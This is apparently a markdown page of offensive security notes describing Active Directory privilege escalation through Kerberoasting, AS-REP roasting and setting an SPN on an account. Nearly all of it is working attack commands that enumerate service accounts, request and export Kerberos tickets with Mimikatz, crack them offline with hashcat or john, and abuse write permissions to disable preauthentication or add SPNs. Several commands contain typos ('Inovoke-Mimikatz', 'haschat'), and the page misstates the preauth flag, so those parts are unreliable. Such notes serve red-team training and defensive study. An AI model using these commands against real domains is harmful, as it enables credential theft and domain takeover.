---
title: Domain Privilege Escalation
category: Active Directory
order: 4
---

Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller.

# Kerberoasting

The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.

> **Note**: Service accounts are many times ignored. Password are rarely changed and have privileged access.


## Getting the TGS

First of all we need to find which users are used as *Service Accounts*:

* PowerView:
```powershell
Get-NetUser -SPN
```
* AD Module:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

After enum it, we need to request a TGS:

* PowerView:
```powershell
Request-SPNTicket
```

* AD Module:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
```

> **Note**: With `klist` you can check if the TGS has been granted.

Finally all tickets should be exported.

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```

## Cracking the tickets

Once the tickets are exported it can be cracked with `john`, `hashcat` or `tgsrepcrack.py` tool:

```
python.exe .\tgsrepcrack.py wordlist.txt ticket.kirbi
```
To crack the ticket with hascat exists a script to export it to a hashcat format.

* https://github.com/jarilaos/kirbi2hashcat

```
haschat -a 0 -m 13100 wordlist.txt ticket.txt
```

# AS-REP Roasting

If a users account does not have the flag _"Do not require Kerberos pre-authentication"_ in _UserAccountControl_ settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.

## Users with No-Preauth set

We need to enumerate accounts with Kerberos Preauth disabled:

* PowerView:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

* AD Module:
```powershell
Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
```

> **Note**: With `GenericAll` or `GenericWrite`, kerberos preauth can be disabled.
> 
> `Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose`

## Cracking the tickets

We can request an encrypted AS-REP for offline brute-force. To do that task we can use `ASREPRoast` module:

```powershell
Import-Module ASREPRoast.ps1
Get-ASREPHash -UserName user01 -Verbose
```
After getting the ticket we can crack it with `john` or `hashcat`:

```
john user01.ticket --wordlist=wordlist.txt
hashcat -a 0 -m 18200 user01.ticket wordlist.txt
```

# Set SPN

With enough privileges such as `GenericAll` or `GenericWrite`, a target user's SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.

We can enumerate the permissions for a group on ACLs:

* PowerView (dev):
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

We can also see if a user already has a SPN:

* PowerView (dev):
```powershell
Get-DomainUser -Identity user01 | select serviceprincipalname
```
* AD Module:
```powershell
Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
```

And we can force the SPN to a user:

* PowerView (dev):
```powershell
Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
```

* AD Module:
```powershell
Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
```

Once we have a SPN set, we can request a TGS:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList "ops/whatever01"
```
And we can export the tickets to the disk:

```powershell
Inovoke-Mimikatz -Command '"kerberos::list /export"'
```
And finally same as *Kerberoasting*, you can crack the ticket with `tgsrepcrack.py`.